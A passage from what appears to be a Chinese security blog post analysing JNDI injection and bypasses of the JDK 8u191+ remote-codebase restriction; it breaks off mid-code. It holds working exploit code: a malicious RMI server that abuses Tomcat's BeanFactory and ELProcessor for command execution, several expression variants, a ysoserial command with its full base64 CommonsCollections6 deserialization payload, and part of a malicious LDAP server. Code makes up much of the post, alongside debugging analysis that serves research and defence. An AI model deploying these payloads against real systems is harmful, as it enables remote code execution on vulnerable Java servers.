class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Determines whether classes may be loaded from an arbitrary URL code base.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TRUST_URL_CODEBASE_PROPERTY =</span><br><span class="line">        <span class="string">"com.sun.jndi.ldap.object.trustURLCodebase"</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String trustURLCodebase =</span><br><span class="line">        AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> PrivilegedAction&lt;String&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> String <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> System.getProperty(TRUST_URL_CODEBASE_PROPERTY,</span><br><span class="line">                        <span class="string">"false"</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (SecurityException e) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">"false"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p>由于loadClass()函数返回的是null，因此getObjectFactoryFromReference()函数同样返回null：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/25.png" alt=""></p><p>getObjectFactoryFromReference()函数返回的null跳过了中间两个getObjectInstance()函数调用而直接返回refInfo：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/26.png" alt=""></p><p>再往后也是返回该Reference类实例直至执行完流程。</p><h4 id="修补点源码对比-1"><a href="#修补点源码对比-1" class="headerlink" title="修补点源码对比"></a>修补点源码对比</h4><p>现在比较下新旧版本的com.sun.naming.internal.VersionHelper12类loadClass()函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 旧版本JDK</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className A non-null fully qualified class name.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> codebase A non-null, space-separated list of URL strings.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">            <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">        ClassLoader parent = getContextClassLoader();</span><br><span class="line">        ClassLoader cl =</span><br><span class="line">                 URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 新版本JDK</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className A non-null fully qualified class name.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> codebase A non-null, space-separated list of URL strings.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">            <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"true"</span>.equalsIgnoreCase(trustURLCodebase)) &#123;</span><br><span class="line">            ClassLoader parent = getContextClassLoader();</span><br><span class="line">            ClassLoader cl =</span><br><span class="line">                    URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>很明显，<strong>就只是在使用URLClassLoader加载器加载远程类之前加了个if语句检测com.sun.jndi.ldap.object.trustURLCodebase的值是否为true，而该设置项的值默认为false</strong>。</p><h2 id="0x02-绕过高版本JDK（8u191-）限制"><a href="#0x02-绕过高版本JDK（8u191-）限制" class="headerlink" title="0x02 绕过高版本JDK（8u191+）限制"></a>0x02 绕过高版本JDK（8u191+）限制</h2><p>由前面知道，在JDK 6u211、7u201、8u191、11.0.1之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</p><p>KINGX提到了如下两种绕过方式：</p><blockquote><ol><li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li><li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li></ol><p>这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。</p></blockquote><p>简单地说，<strong>在低版本JDK的JNDI注入中，主要利用的就是classFactoryLocation这个参数来实现远程加载类利用的。但是在高版本JDK中对classFactoryLocation这个途径实现了限制，但是对于classFactory这个参数即本地ClassPath中如果存在Gadget的话还是能够进行JNDI注入攻击的</strong>。</p><h3 id="利用本地恶意Class作为Reference-Factory"><a href="#利用本地恶意Class作为Reference-Factory" class="headerlink" title="利用本地恶意Class作为Reference Factory"></a>利用本地恶意Class作为Reference Factory</h3><p>简单地说，就是要服务端本地ClassPath中存在恶意Factory类可被利用来作为Reference Factory进行攻击利用。该恶意Factory类必须实现<code>javax.naming.spi.ObjectFactory</code>接口，实现该接口的getObjectInstance()方法。</p><p>大佬找到的是这个<code>org.apache.naming.factory.BeanFactory</code>类，其满足上述条件并存在于Tomcat依赖包中，应用广泛。该类的getObjectInstance()函数中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。</p><p>现在来看下RMI攻击向量的代码是如何实现的。</p><h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>具体依赖Tomcat中的jar包为：catalina.jar、el-api.jar、jasper-el.jar。</p><p>恶意RMI服务端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Evil RMI Server is Listening on port: 6666"</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry( <span class="number">6666</span>);</span><br><span class="line">        <span class="comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">        <span class="comment">// 利用表达式执行命令</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash', '-c', 'touch /tmp/mi1k7ea']).start()\")"</span>));</span><br><span class="line">        System.out.println(<span class="string">"[*]Evil command: touch /tmp/mi1k7ea"</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JNDI客户端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String uri = <span class="string">"rmi://localhost:6666/Object"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打包成jar，在Linux环境（Java版本为1.8.0_252）下运行该jar包，监听在6666端口：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/11.png" alt=""></p><p>这里通过<code>-classpath</code>或<code>-cp</code>参数来假设是服务端的含有Tomcat相关jar包的ClassPath环境，运行即可成功执行命令：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/12.png" alt=""></p><h4 id="几种变体的表达式"><a href="#几种变体的表达式" class="headerlink" title="几种变体的表达式"></a>几种变体的表达式</h4><p>前面的恶意表达式就是通过反射的方式来实现命令执行的，本地测试有如下几种变体，原理都是基于反射调用任意类方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.el.ELProcessor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String poc = <span class="string">"''.getClass().forName('javax.script.ScriptEngineManager')"</span> +</span><br><span class="line">                <span class="string">".newInstance().getEngineByName('nashorn')"</span> +</span><br><span class="line">                <span class="string">".eval(\"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.lang.Runtime.getRuntime().exec(s);\")"</span>;</span><br><span class="line"><span class="comment">//        String poc = "''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass())" +</span></span><br><span class="line"><span class="comment">//                ".invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime')" +</span></span><br><span class="line"><span class="comment">//                ".invoke(null),'calc.exe')&#125;";</span></span><br><span class="line"><span class="comment">//        String poc = "''.getClass().forName('javax.script.ScriptEngineManager')" +</span></span><br><span class="line"><span class="comment">//                ".newInstance().getEngineByName('JavaScript')" +</span></span><br><span class="line"><span class="comment">//                ".eval(\"java.lang.Runtime.getRuntime().exec('calc')\")";</span></span><br><span class="line">        <span class="keyword">new</span> ELProcessor().eval(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>直接在org.apache.naming.factory.BeanFactory类getObjectInstance()函数上打上断点debug，此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getObjectInstance:119, BeanFactory (org.apache.naming.factory)</span><br><span class="line">getObjectInstance:321, NamingManager (javax.naming.spi)</span><br><span class="line">decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:138, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">main:8, Client</span><br></pre></td></tr></table></figure><p>这里注意到javax.naming.spi.NamingManager类的getObjectInstance()函数，其中调用了getObjectFactoryFromReference()函数来从Reference中获取ObjectFactory类实例，跟进去会发现是通过loadClass()函数来加载我们传入的org.apache.naming.factory.BeanFactory类，然后新建该类实例并将其转换成ObjectFactory类型，也就是说，<strong>我们传入的Factory类必须实现ObjectFactory接口类、而org.apache.naming.factory.BeanFactory正好满足这一点</strong>：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/14.png" alt=""></p><p>往下，直接调用ObjectFactory接口实现类实例的getObjectInstance()函数，这里是BeanFactory类实例的getObjectInstance()函数：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/15.png" alt=""></p><p>跟进看到org.apache.naming.factory.BeanFactory类的getObjectInstance()函数中，会判断obj参数是否是ResourceRef类实例，是的话代码才会往下走，<strong>这就是为什么我们在恶意RMI服务端中构造Reference类实例的时候必须要用Reference类的子类ResourceRef类来创建实例</strong>：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/13.png" alt=""></p><p>接着获取Bean类为<code>javax.el.ELProcessor</code>后，实例化该类并获取其中的forceString类型的内容，其值是我们构造的<code>x=eval</code>内容：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/16.png" alt=""></p><p>继续往下调试可以看到，查找forceString的内容中是否存在”=”号，不存在的话就调用属性的默认setter方法，存在的话就取键值、其中键是属性名而对应的值是其指定的setter方法。如此，<strong>之前设置的forceString的值就可以强制将x属性的setter方法转换为调用我们指定的eval()方法了，这是BeanFactory类能进行利用的关键点！</strong>之后，就是获取beanClass即javax.el.ELProcessor类的eval()方法并和x属性一同缓存到forced这个HashMap中：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/17.png" alt=""></p><p>接着是多个do while语句来遍历获取ResourceRef类实例addr属性的元素，当获取到addrType为x的元素时退出当前所有循环，然后调用getContent()函数来获取x属性对应的contents即恶意表达式。这里就是恶意RMI服务端中ResourceRef类实例添加的第二个元素：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/18.png" alt=""></p><p>获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后就是通过method.invoke()即反射调用的来执行<code>new ELProcessor().eval(&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;cmd&#39;, &#39;/C&#39;, &#39;calc.exe&#39;]).start()&quot;))</code>：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/19.png" alt=""></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>小结一下几个关键点：</p><ul><li>这种方法是从本地ClassPath中寻找可能存在Tomcat相关依赖包来进行触发利用，已知的类是<code>org.apache.naming.factory.BeanFactory</code>；</li><li>由于<code>org.apache.naming.factory.BeanFactory</code>类的getObjectInstance()方法会判断是否为ResourceRef类实例，因此在RMI服务端绑定的Reference类实例中必须为Reference类的子类ResourceRef类实例，这里resourceClass选择的也是在Tomcat环境中存在的<code>javax.el.ELProcessor</code>类；</li><li>ResourceRef类实例分别添加了两次StringRefAddr类实例元素，第一次是类型为<code>forceString</code>、内容为<code>x=eval</code>的StringRefAddr类实例，这里看<code>org.apache.naming.factory.BeanFactory</code>类的getObjectInstance()方法源码发现，程序会判断是否存在<code>=</code>号，若存在则将<code>x</code>属性的默认setter方法设置为我们<code>eval</code>；第二次是类型为<code>x</code>、内容为恶意表达式的StringRefAddr类实例，这里是跟前面的<code>x</code>属性关联起来，<code>x</code>属性的setter方法是eval()，而现在它的内容为恶意表达式，这样就能串起来调用<code>javax.el.ELProcessor</code>类的eval()函数执行恶意表达式从而达到攻击利用的目的；</li></ul><h3 id="利用LDAP返回序列化数据，触发本地Gadget"><a href="#利用LDAP返回序列化数据，触发本地Gadget" class="headerlink" title="利用LDAP返回序列化数据，触发本地Gadget"></a>利用LDAP返回序列化数据，触发本地Gadget</h3><p>之前在JNDI注入的文章中讲到了可以利用LDAP+Reference的方式进行攻击利用，但是在JDK 8u191以后的版本中增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。但是，攻击者仍然可以通过服务端本地ClassPath中存在的反序列化漏洞Gadget来绕过高版本JDK的限制。</p><p>LDAP服务端除了支持JNDI Reference这种利用方式外，还支持直接返回一个序列化的对象。如果Java对象的javaSerializedData属性值不为空，则客户端的obj.decodeObject()方法就会对这个字段的内容进行反序列化。此时，如果服务端ClassPath中存在反序列化咯多功能利用Gadget如CommonsCollections库，那么就可以结合该Gadget实现反序列化漏洞攻击。</p><h4 id="攻击利用-1"><a href="#攻击利用-1" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>假设目标环境存在Commons-Collections-3.2.1包，且存在JNDI的lookup()注入或Fastjson反序列化漏洞。</p><p>使用ysoserial工具生成Commons-Collections这条Gadget并进行Base64编码输出：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-<span class="number">6</span>eca5bc740-<span class="number">1</span>.jar CommonsCollections6 <span class="string">'calc'</span> | base64</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=</span><br></pre></td></tr></table></figure><p>恶意LDAP服务器如下，主要是在javaSerializedData字段内填入刚刚生成的反序列化payload数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8000/#EvilObject"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> 